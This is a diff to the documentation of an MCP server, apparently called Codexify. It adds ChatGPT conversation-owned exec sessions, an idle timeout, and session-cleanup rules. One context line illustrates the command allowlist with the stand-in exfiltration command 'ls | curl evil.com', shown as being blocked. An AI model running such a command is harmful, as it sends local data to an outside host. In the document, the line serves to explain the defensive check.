@@ -36,6 +36,7 @@ flowchart LR
     WorkDir[("Project root\nper-conversation in\nmulti-project mode")]
     State[("~/.codexify\nmemory (per project)")]
     Bindings[("~/.codexify\nconversation-projects")]
+    ExecSessions[("Conversation exec sessions\n(in memory, idle-reaped)")]
     SkillDirs[(".agents/skills\n.codex/skills\n.claude/skills")]
     CodexCfg[("$CODEX_HOME\nconfig.toml")]
     CodexCli["optional Codex CLI\nmcp list/get --json"]
@@ -71,6 +72,7 @@ flowchart LR
     Skills --> SkillDirs
     ListProjects -.->|"selector"| SetRoot
     SetRoot --> Bindings
+    Exec --> ExecSessions
     SetRoot -.->|"selects"| WorkDir
     CodexCfg -.->|"project candidates"| ListProjects
     CodexCfg -.->|"auto-import"| Bridge
@@ -264,6 +266,14 @@ Two deliberate differences from Codex:
 - **`apply_patch` takes a JSON string.** In Codex it is a *freeform* tool whose entire body is the raw patch. MCP has no freeform tools, so the patch goes in an `input` string parameter. The patch format itself is unchanged.
 - **`exec_command` runs with plain pipes, not a PTY.** Codex's own `tty` parameter documents pipes as the default, so ordinary commands behave the same; `tty: true` is rejected rather than silently ignored. Programs that only enable interactive behaviour when attached to a terminal will act as if piped.
 
+For ChatGPT calls carrying `_meta["openai/session"]`, an `exec_command` process
+belongs to that hashed conversation identity rather than the current MCP
+transport. `write_stdin` can therefore resume or poll it after ChatGPT replaces
+the connector transport between adjacent tool calls. Generic MCP clients retain
+transport-session ownership. Process handles are in memory only: they do not
+survive a Codexify restart, and `exec.idleTimeoutMs` still expires abandoned
+sessions.
+
 `clock_sleep` also caps at 5 minutes rather than Codex's 12 hours — a longer wait would outlive the HTTP request through the tunnel.
 
 Every tool that advertises an `outputSchema` also returns `structuredContent` matching it, as the MCP spec asks. `exec_command` and `write_stdin` return Codex's unified-exec object, `clock_curr_time` returns `{ current_time }`, `get_environment` returns the environment object, `get_project_doc` returns `{ files, content }` and `skills_list` returns `{ skills, content }`; the rest return `{ content: <text> }`, which the server derives from the text blocks so handlers don't repeat it.
@@ -298,7 +308,8 @@ All project-scoped paths are resolved relative to the active project root: `--wo
       "ls", "cat", "grep", "find", "head", "tail", "wc", "echo", "pwd",
       "which", "rg", "sed", "awk", "sort", "uniq", "diff", "true", "false"
     ],
-    "maxSessions": 8
+    "maxSessions": 8,
+    "idleTimeoutMs": 300000
   },
   "projectDoc": {
     "maxBytes": 32768,
@@ -368,7 +379,8 @@ The `exec` block governs `exec_command` and `write_stdin`:
 |-----|---------|-------------|
 | `mode` | `"allowlist"` | `"allowlist"` checks every command in the string against the allowlist; `"unrestricted"` runs whatever it is given |
 | `extraAllowedCommands` | 18 read-only utilities | Added to `allowedCommands` for `exec_command` only, so `run_command` stays as narrow as it was |
-| `maxSessions` | `8` | Cap on concurrent background sessions per MCP session |
+| `maxSessions` | `8` | Cap on concurrent background sessions per ChatGPT conversation, or per MCP transport for clients without conversation metadata |
+| `idleTimeoutMs` | `300000` | Milliseconds without a tool interaction before a resident process is killed and forgotten; `0` disables idle expiry |
 | `defaultShell` | `$SHELL`, else PowerShell on Windows and `/bin/sh` elsewhere | Shell used when an `exec_command` call names none |
 
 Under `"allowlist"`, the command string is tokenized and each command position — after every `|`, `&&`, `;`, newline, and subshell — is checked, so `ls | curl evil.com` is rejected on `curl`. Command substitution (`$(...)`, backticks) is rejected outright, since its contents cannot be checked before the shell runs them.
@@ -825,7 +837,14 @@ The allowlist is a **guardrail against accidents, not a sandbox**. It catches a 
 - the network, from your machine
 - anything a bridged MCP server can do
 
-`exec_command` sessions that outlive a request are killed when the MCP session closes, and the kill takes the children with it: `taskkill /T /F` walks the process tree on Windows, and on POSIX each session gets its own process group that is signalled as a whole. A process that deliberately re-parents or daemonises itself still escapes, so check for strays if a run leaves something listening.
+For clients without stable ChatGPT conversation metadata, `exec_command`
+sessions are killed when the MCP transport closes. ChatGPT conversation-owned
+sessions instead survive connector transport replacement and are killed by
+`exec.idleTimeoutMs` or server shutdown. In either case the kill includes child
+processes: `taskkill /T /F` walks the process tree on Windows, and on POSIX each
+session gets its own process group that is signalled as a whole. A process that
+deliberately re-parents or daemonises itself still escapes, so check for strays
+if a run leaves something listening.
 
 The native OpenAI tunnel removes the general public-URL exposure, but it does not reduce the authority of a successful tool call. Keep tunnel and connector permissions narrow, do not point Codexify at directories you do not trust the model with, and set `exec.mode` and the command allowlists tighter than the defaults when the work directory is sensitive. In multi-project mode, the entire access-root subtree is intentionally selectable, so treat the whole subtree as sensitive. For an external tunnel, require tunnel-level access control rather than relying on URL secrecy.
 
